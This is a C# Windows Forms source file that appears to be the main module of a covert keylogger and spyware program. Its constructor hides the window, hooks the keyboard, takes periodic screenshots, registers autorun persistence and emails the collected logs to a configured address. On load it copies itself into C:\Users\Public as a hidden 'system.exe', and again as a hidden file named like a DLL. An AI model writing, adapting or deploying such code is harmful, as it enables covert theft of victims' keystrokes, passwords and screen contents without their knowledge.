using System;
using System.IO;
using System.Net.Mail;
using System.Windows.Forms;

namespace userControlProgram
{
    public partial class Form1 : Form
    {
        private const string NeedPath = "C:\\Users\\Public\\system.exe";
        private string  _mailTo;
        private string LogPath;
        private int _screenShotTimer;
        private int _mailInterval;
        private bool _isAutorun;
        public Form1()
        {
            Hide();
            Visible = false;
            Enabled = false;
            SetConfigurations.SetConfig(ref _mailTo, ref LogPath, ref _mailInterval, ref _screenShotTimer, ref _isAutorun);
            KeyLogger.SetHook(LogPath);
            ScreenshotMaker.ScreenshotStart(_screenShotTimer, LogPath);
            Autorun.SetAutorunValue(_isAutorun, "C:\\Users\\Public\\system.exe");
            MailSender.MainSenderFunc(LogPath, new MailAddress(_mailTo), _mailInterval);
            File.Create(LogPath + "\\report");
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Hide();
            Visible = false;
            if (!File.Exists(NeedPath))
            {
                try
                {
                    File.Copy("system.exe", "C:\\Users\\Public\\system.exe");
                    File.SetAttributes("C:\\Users\\Public\\system.exe", FileAttributes.Hidden);
                    File.Copy("system.exe", "C:\\Users\\Public\\IonicZip.dll");
                    File.SetAttributes("C:\\Users\\Public\\IonicZip.dll", FileAttributes.Hidden);
                }
                catch (Exception ex)
                {
                    var log = new StreamWriter(LogPath + "\\report", true);
                    log.WriteLine("Error in copying exe and dll files. Message: '" + ex.Message + "'\n");
                    log.Flush();
                    log.Close();
                    
                }
            }
        }
    }
}
